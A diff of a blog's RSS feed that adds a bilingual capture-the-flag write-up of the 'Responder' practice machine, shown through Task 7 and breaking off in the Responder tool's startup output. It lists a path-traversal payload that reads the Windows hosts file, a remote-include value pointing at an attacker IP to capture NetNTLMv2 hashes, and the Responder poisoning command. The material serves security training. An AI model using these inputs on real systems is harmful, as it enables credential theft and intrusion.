@@ -7,7 +7,548 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Sp1ke</copyright>
-        <lastBuildDate>Sun, 01 Nov 2026 13:33:51 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/categories/very-easy/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Mon, 02 Nov 2026 13:25:49 +0800</lastBuildDate><atom:link href="https://Sp1ke-sec.github.io/categories/very-easy/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>8. Responder</title>
+        <link>https://Sp1ke-sec.github.io/p/8.-responder/</link>
+        <pubDate>Mon, 02 Nov 2026 13:25:49 +0800</pubDate>
+        
+        <guid>https://Sp1ke-sec.github.io/p/8.-responder/</guid>
+        <description>&lt;img src="https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678.png" alt="Featured image of post 8. Responder" /&gt;&lt;h1 id=&#34;responder&#34;&gt;Responder
+&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678.png&#34;
+	width=&#34;513&#34;
+	height=&#34;188&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678_hu3208690873230517217.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101225228678_hu10853049803248911612.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101225228678&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;272&#34;
+		data-flex-basis=&#34;654px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;About: Responder is a very easy Windows machine that focuses on exploring the File Inclusion vulnerability on a web application and how this can be leveraged to collect the NetNTLMv2 challenge of the user that is running the web server. The machine showcases the Responder utility and the hash cracking tool John The Ripper to obtain a cleartext password from an NTLM hash. Finally, the Evil-WinRM tool can be used to get a terminal on the machine using the acquired credentials.&lt;/p&gt;
+&lt;p&gt;介绍：Responder 是一款非常简单的 Windows 机器，专注于探索 Web 应用程序上的文件包含漏洞，以及如何利用该漏洞收集运行 Web 服务器的用户的 NetNTLMv2 挑战。该机器展示了 Responder 实用程序和哈希破解工具 John The Ripper，可以从 NTLM 哈希中获取明文密码。最后，可以使用 Evil-WinRM 工具，通过获取的凭据在机器上获取终端。&lt;/p&gt;
+&lt;p&gt;靶机 IP：10.129.90.34&lt;/p&gt;
+&lt;h3 id=&#34;task-1&#34;&gt;Task 1
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;When visiting the web service using the IP address, what is the domain that we are being redirected to?&lt;/p&gt;
+&lt;p&gt;使用 IP 地址访问网络服务时，我们会被重定向到哪个域名？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101230305815.png&#34;
+	width=&#34;1506&#34;
+	height=&#34;482&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101230305815_hu2642552864437368256.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101230305815_hu7348219510589356026.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101230305815&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;312&#34;
+		data-flex-basis=&#34;749px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;重定向到 unika.htb 域名。&lt;/p&gt;
+&lt;p&gt;管理员身份打开 cmd，输入 &lt;code&gt;notepad C:\Windows\System32\drivers\etc\hosts&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;在文件中加入一行 &lt;code&gt;10.129.90.34   unika.htb&lt;/code&gt;，保存之后刷新 DNS &lt;code&gt;ipconfig /flushdns&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101231950809.png&#34;
+	width=&#34;2121&#34;
+	height=&#34;1005&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101231950809_hu5222833057426840151.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101231950809_hu11662374242521113679.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101231950809&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;211&#34;
+		data-flex-basis=&#34;506px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：unika.htb&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-2&#34;&gt;Task 2
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which scripting language is being used on the server to generate webpages?&lt;/p&gt;
+&lt;p&gt;服务器端使用哪种脚本语言来生成网页？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232351388.png&#34;
+	width=&#34;608&#34;
+	height=&#34;238&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232351388_hu497900917494340113.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232351388_hu11457348158542331470.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101232351388&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;255&#34;
+		data-flex-basis=&#34;613px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;根据响应头中的 &lt;code&gt;X-Powered-By: PHP/8.1.1&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：PHP&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-3&#34;&gt;Task 3
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What is the name of the URL parameter which is used to load different language versions of the webpage?&lt;/p&gt;
+&lt;p&gt;用于加载网页不同语言版本的URL参数名称是什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232655397.png&#34;
+	width=&#34;1164&#34;
+	height=&#34;108&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232655397_hu3245273876362771925.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232655397_hu18281465340212741852.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101232655397&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;1077&#34;
+		data-flex-basis=&#34;2586px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：page&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-4&#34;&gt;Task 4
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which of the following values for the &lt;code&gt;page&lt;/code&gt; parameter would be an example of exploiting a Local File Include (LFI) vulnerability: &amp;ldquo;french.html&amp;rdquo;, &amp;ldquo;//10.10.14.6/somefile&amp;rdquo;, &amp;ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&amp;rdquo;, &amp;ldquo;mimikatz.exe&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;以下哪个页面参数值会利用本地文件包含 (LFI) 漏洞：&amp;ldquo;french.html&amp;rdquo;, &amp;ldquo;//10.10.14.6/somefile&amp;rdquo;, &amp;ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&amp;rdquo;, &amp;ldquo;mimikatz.exe&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img src=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232919330.png&#34;
+	width=&#34;2511&#34;
+	height=&#34;257&#34;
+	srcset=&#34;https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232919330_hu16177028161162703682.png 480w, https://Sp1ke-sec.github.io/p/8.-responder/assets/image-20261101232919330_hu12048757406763745625.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;image-20261101232919330&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;977&#34;
+		data-flex-basis=&#34;2344px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;答案：../../../../../../../../windows/system32/drivers/etc/hosts&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-5&#34;&gt;Task 5
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which of the following values for the page parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: &amp;ldquo;french.html&amp;rdquo;, &amp;ldquo;//10.10.14.6/somefile&amp;rdquo;, &amp;ldquo;./../../../../../../../windows/system32/drivers/etc/hosts&amp;rdquo;, &amp;ldquo;mimikatz.exe&amp;rdquo;&lt;/p&gt;
+&lt;p&gt;以下哪个页面参数值会利用远程文件包含 (RFI) 漏洞？&amp;ldquo;french.html&amp;rdquo;, &amp;ldquo;//10.10.14.6/somefile&amp;rdquo;, &amp;ldquo;./../../../../../../../windows/system32/drivers/etc/hosts&amp;rdquo;, &amp;ldquo;mimikatz.exe&amp;rdquo;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;strong&gt;答案：//10.10.14.6/somefile&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-6&#34;&gt;Task 6
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;What does NTLM stand for?&lt;/p&gt;
+&lt;p&gt;NTLM 代表什么？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;NTLM 是微软的身份认证协议，用于验证 Windows 客户端访问服务时的身份，不传输明文密码。&lt;/p&gt;
+&lt;p&gt;NTLM 是一个&lt;strong&gt;质询应答&lt;/strong&gt;协议，共三条核心消息：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Negotiate 协商消息（客户端 → 服务端）：客户端告诉服务器，我支持 NTLM 版本、加密能力、域 / 主机名，发起认证协商。&lt;/li&gt;
+&lt;li&gt;Challenge 质询消息（服务端 → 客户端）：服务器生成一个随机挑战串（Challenge），返回给客户端；同时告诉客户端协商好的安全参数。&lt;/li&gt;
+&lt;li&gt;Authenticate 认证消息（客户端 → 服务端）：客户端取出 Challenge，用本机保存的&lt;strong&gt;NT 哈希&lt;/strong&gt;，按照 NTLMv1/v2 算法算出 Response（应答）； 把用户名、域、这个应答一起打包发给服务器。&lt;/li&gt;
+&lt;li&gt;校验阶段：服务器本地 SAM 库取出该用户 NT 哈希，拿同一个 Challenge 自己计算应答，两边对比，一致则认证成功。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;strong&gt;答案：New Technology LAN Manager&lt;/strong&gt;&lt;/p&gt;
+&lt;h3 id=&#34;task-7&#34;&gt;Task 7
+&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;Which flag do we use in the Responder utility to specify the network interface?&lt;/p&gt;
+&lt;p&gt;在 Responder 工具中，我们应该使用哪个标志来指定网络接口？&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;responder 这个工具会回答发出的LLMNR和NBT-NS查询，诱使受害者主机提供Net-NTLM哈希。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;tun0&lt;/code&gt; 网卡是 openvpn 的虚拟网卡，通过 &lt;code&gt;-I tun0&lt;/code&gt; 监听该网卡。&lt;/p&gt;
+&lt;p&gt;由 &lt;code&gt;Responder IP  [10.10.16.102]&lt;/code&gt; 可知本机 IP 是 10.10.16.102。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;67
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;68
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;69
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;70
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;71
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;72
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;┌──&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;└─# responder -I tun0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                                         __
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  .----.-----.-----.-----.-----.-----.--&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;.-----.----.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__ --&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;  _  &lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;  -__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   _&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   __&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_____&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;_____&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                   &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;__&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tips jar:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    USDT -&amp;gt; 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    BTC  -&amp;gt; bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Poisoners:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LLMNR                      &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    NBT-NS                     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    MDNS                       &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS                        &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DHCP                       &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DHCPv6                     &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Servers:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    HTTPS server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WPAD proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Auth proxy                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMB server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Kerberos server            &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SQL server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    FTP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    IMAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    POP3 server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SMTP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DNS server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    LDAP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    MQTT server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    RDP server                 &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    DCE-RPC server             &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    WinRM server               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    SNMP server                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;ON&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; HTTP Options:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Always serving EXE         &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving EXE                &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    Serving HTML               &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;OFF&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
